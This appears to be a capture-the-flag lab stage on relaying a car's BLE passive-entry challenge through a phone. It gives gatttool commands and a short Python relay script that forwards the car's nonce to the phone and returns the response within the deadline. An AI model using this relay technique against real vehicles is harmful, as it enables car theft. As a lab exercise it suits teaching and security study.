# Relaying a Proximity Check the Car Believes (Relay)

The goal of this stage is as follows:
*  Passive entry has to know the phone is nearby, and the proof it accepts is a challenge answered quickly. A phone across the street would take too long to reach.
*  A relay that forwards the response inside a single connection event adds only a few milliseconds, which is inside the ordinary variation of a device answering. The car cannot tell.
*  Two peripherals are advertising here. The car issues a challenge and expects the answer within its deadline.
*  The phone holds the key and answers anyone who asks. It cannot tell the car from something standing between them.
*  **The car cannot reach the phone. You can reach both.**
*  Every read of the challenge produces a fresh one and restarts the clock, so an answer cannot be prepared in advance.

Task:
*  Find both peripherals and walk each attribute table.

```
hcitool lescan
gatttool -b <address> --char-desc
```

*  Try the three steps as separate commands first, and read the car's verdict.

```
gatttool -b <car> --char-read -a <challenge handle>
gatttool -b <phone> --char-write-req -a <challenge in> -n <the challenge>
gatttool -b <phone> --char-read -a <response out>
gatttool -b <car> --char-write-req -a <response handle> -n <the response>
```

*  It says how long you took. A fresh connection per step does not make the deadline.
*  Hold both connections open and relay in one pass.

```
#!/usr/bin/python3
import sys
sys.path.insert(0, "/challenge")
import ble

car = ble.Client("<car>")
phone = ble.Client("<phone>")          # both open before the clock starts

nonce = car.read(<challenge handle>)
phone.write(<challenge in>, nonce)
car.write(<response handle>, phone.read(<response out>))
```

*  Read the verdict, then the cabin.

Answer for a phone that is not there and the cabin gives up the flag!
